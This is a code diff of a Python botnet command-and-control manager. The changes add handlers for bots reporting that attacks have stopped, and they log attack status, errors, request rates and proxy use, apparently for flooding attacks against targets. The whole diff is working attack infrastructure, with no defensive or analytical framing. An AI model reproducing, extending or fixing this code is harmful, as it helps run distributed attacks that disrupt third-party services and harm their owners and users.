@@ -65,7 +65,7 @@ class ProxyDistributionConfig:
 
 
 # ================================================================
-# BOTNET MANAGER v8.3 — OPTIMAL, FIXED & MAXIMIZED
+# BOTNET MANAGER v8.4 — FIXED & SYNCED
 # ================================================================
 class BotnetManager:
     def __init__(self):
@@ -79,7 +79,6 @@ class BotnetManager:
 
     @property
     def attack_manager(self):
-        """Lazy load attack_manager to avoid circular import."""
         if self._attack_manager is None:
             from app.managers.attack_manager import attack_manager
             self._attack_manager = attack_manager
@@ -124,7 +123,7 @@ class BotnetManager:
             return
 
         bot_id = bot_id.strip()
-        
+
         if not msg_type:
             logger.debug(f"Message from {bot_id} without type field. Keys: {list(msg.keys())}")
             if "cmd" in msg:
@@ -146,6 +145,12 @@ class BotnetManager:
             await self._handle_attack_progress(msg)
         elif msg_type == "attack_started":
             logger.info(f"Bot {bot_id} started attack {msg.get('attack_id')}")
+        elif msg_type == "attack_stopped":
+            logger.info(f"Bot {bot_id} stopped attack {msg.get('attack_id')}")
+        elif msg_type == "all_stopped":
+            # FIX #1: Handle all_stopped from bot
+            logger.info(f"Bot {bot_id} confirmed all attacks stopped")
+            await self._handle_all_stopped(msg)
         elif msg_type == "proxy_updated":
             logger.info(f"Bot {bot_id} updated proxies: {msg.get('count', 0)} proxies")
         elif msg_type == "proxy_refreshed":
@@ -315,10 +320,10 @@ class BotnetManager:
 
         if "type" not in command:
             command["type"] = "command"
-            
+
         cmd_json = json.dumps(command) + "\n"
         excluded_set = set(exclude) if exclude else set()
-        
+
         tasks = []
         for bot_id, writer in zip(bot_ids, writers):
             if bot_id in excluded_set:
@@ -335,7 +340,7 @@ class BotnetManager:
             writer = self.active_writers.get(bot_id)
             if not writer or writer.is_closing():
                 return False
-        
+
         if "type" not in command:
             command["type"] = "command"
         cmd_json = json.dumps(command) + "\n"
@@ -462,6 +467,19 @@ class BotnetManager:
         bot_key = f"{RedisKeys.PREFIX}bot:{bot_id}"
         await redis.hset(bot_key, "last_heartbeat", now)
 
+    async def _handle_all_stopped(self, msg: dict):
+        """FIX: Handle all_stopped message from bot."""
+        bot_id = msg.get("id")
+        logger.info(f"🛑 Bot {bot_id} confirmed all attacks stopped")
+        # Update any active attacks that might be lingering
+        attack_mgr = self.attack_manager
+        for attack_id in list(attack_mgr.active_attacks.keys()):
+            attack = attack_mgr.active_attacks.get(attack_id)
+            if attack:
+                attack.rps = 0
+                await attack_mgr._save_attack_to_redis(attack)
+        log_bot_event(bot_id, "all_stopped", {"message": "Bot confirmed all attacks stopped"})
+
     async def _handle_attack_result(self, msg: dict):
         bot_id = msg.get("id")
         attack_id = msg.get("attack_id")
@@ -469,15 +487,18 @@ class BotnetManager:
         rps = msg.get("rps", 0)
         proxy_requests = msg.get("proxy_requests", 0)
         direct_requests = msg.get("direct_requests", 0)
+        status = msg.get("status", "completed")
+        error = msg.get("error")
 
         if not attack_id:
             logger.warning(f"Attack result from {bot_id} missing attack_id")
             return
 
         logger.info(f"📊 Final result from {bot_id} for {attack_id}: {total_requests} reqs, {rps} RPS, "
-                    f"proxy={proxy_requests}, direct={direct_requests}")
+                    f"proxy={proxy_requests}, direct={direct_requests}, status={status}")
+        if error:
+            logger.warning(f"Bot {bot_id} attack {attack_id} error: {error}")
 
-        # FIX: Use lazy-loaded attack_manager
         attack_mgr = self.attack_manager
         if attack_id in attack_mgr.active_attacks:
             attack = attack_mgr.active_attacks.get(attack_id)
@@ -491,6 +512,8 @@ class BotnetManager:
                     "rps": rps,
                     "proxy_requests": proxy_requests,
                     "direct_requests": direct_requests,
+                    "status": status,
+                    "error": error,
                 })
 
         redis = await get_redis()
@@ -516,7 +539,6 @@ class BotnetManager:
         logger.debug(f"📈 Progress from {bot_id} for {attack_id}: +{delta_requests} reqs, "
                      f"{current_rps} RPS, proxy={proxy_requests}, pool={proxy_pool_alive}")
 
-        # FIX: Use lazy-loaded attack_manager
         attack_mgr = self.attack_manager
         if attack_id in attack_mgr.active_attacks:
             attack = attack_mgr.active_attacks.get(attack_id)
